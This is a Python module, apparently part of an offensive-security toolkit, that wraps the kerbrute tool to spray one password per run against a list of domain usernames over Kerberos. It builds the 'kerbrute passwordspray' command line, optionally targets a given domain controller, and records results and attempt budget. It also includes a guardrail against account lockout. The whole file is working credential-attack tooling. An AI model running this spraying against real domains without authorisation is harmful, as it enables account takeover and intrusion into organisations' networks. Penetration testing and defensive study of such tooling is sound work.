"""
Execution logic for kerbrute_spray: horizontal Kerberos password spraying
against active domain usernames using a strictly bounded single password per run.
"""
from __future__ import annotations

import os
import shutil
import subprocess
from dataclasses import dataclass, field
from typing import List, Optional

from tradecraft.adapters.wordlists import resolve_wordlist

DEFAULT_TIMEOUT_SECONDS = 90


@dataclass
class RawKerbruteSprayResult:
    stdout: str = ""
    stderr: str = ""
    returncode: int = 0
    domain: str = ""
    password: str = ""
    valid_credentials: List[str] = field(default_factory=list)
    # 1 once the subprocess actually launched, 0 if a pre-flight check
    # rejected the call first -- a rejected call must not consume budget.
    attempts_run: int = 0
    error: Optional[str] = None


def find_binary() -> Optional[str]:
    """Finds kerbrute binary on PATH."""
    return shutil.which("kerbrute")


def build_argv(
    domain: str,
    password: str,
    wordlist_path: str,
    dc_ip: str = "",
    binary: str = "kerbrute",
) -> List[str]:
    cmd = [
        binary,
        "passwordspray",
        "-d",
        domain.strip(),
    ]
    if dc_ip.strip():
        cmd.extend(["--dc", dc_ip.strip()])
    cmd.extend([wordlist_path, password])
    return cmd


def execute(
    domain: str,
    password: str,
    user_wordlist: str = "kerbrute-usernames",
    dc_ip: str = "",
    timeout: int = DEFAULT_TIMEOUT_SECONDS,
) -> RawKerbruteSprayResult:
    d = domain.strip()
    p = password.strip()
    if not d:
        return RawKerbruteSprayResult(error="empty domain")
    if not p:
        return RawKerbruteSprayResult(domain=d, error="single password is required for kerbrute_spray")

    # Guardrail: strictly one password per run to prevent account lockout
    if "\n" in p or "\r" in p:
        return RawKerbruteSprayResult(
            domain=d,
            error="kerbrute_spray enforces strictly a single password per run to prevent account lockout",
        )

    binary = find_binary()
    if not binary:
        return RawKerbruteSprayResult(domain=d, password=p, error="kerbrute executable not found on PATH")

    resolved_wl = resolve_wordlist(user_wordlist, fallback="kerbrute-usernames.txt")
    if not os.path.isfile(resolved_wl):
        return RawKerbruteSprayResult(domain=d, password=p, error=f"user wordlist not found: {resolved_wl}")

    argv = build_argv(
        domain=d,
        password=p,
        wordlist_path=resolved_wl,
        dc_ip=dc_ip,
        binary=binary,
    )

    try:
        proc = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            timeout=timeout,
            stdin=subprocess.DEVNULL,
        )
        return RawKerbruteSprayResult(
            stdout=proc.stdout or "",
            stderr=proc.stderr or "",
            returncode=proc.returncode,
            domain=d,
            password=p,
            attempts_run=1,
        )
    except FileNotFoundError:
        return RawKerbruteSprayResult(domain=d, password=p, error="kerbrute executable not found on PATH")
    except subprocess.TimeoutExpired:
        return RawKerbruteSprayResult(
            domain=d, password=p, error=f"kerbrute timed out after {timeout}s", attempts_run=1
        )
    except Exception as exc:
        return RawKerbruteSprayResult(
            domain=d, password=p, error=f"kerbrute execution failed: {exc}", attempts_run=1
        )
